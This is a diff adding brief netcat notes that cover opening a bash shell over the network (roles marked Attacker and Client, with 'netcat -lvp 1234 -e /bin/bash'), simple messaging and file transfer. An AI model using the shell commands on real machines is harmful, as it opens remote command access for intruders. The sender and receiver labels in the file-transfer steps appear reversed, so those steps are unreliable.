@@ -1,0 +1,16 @@
+#Deploying bash shell
+Attacker 
+1.netcat 192.168.43.88 1234
+
+Client
+2.netcat -lvp 1234 -e /bin/bash
+
+#Messaging
+1.netcat -lvp 1234
+2.netcat 192.168.43.88 1234
+
+#Sending Files
+Sender
+1.netcat -lvp 1234 > hello.txt
+Receiver
+2.netcat 192.168.43.88 1234
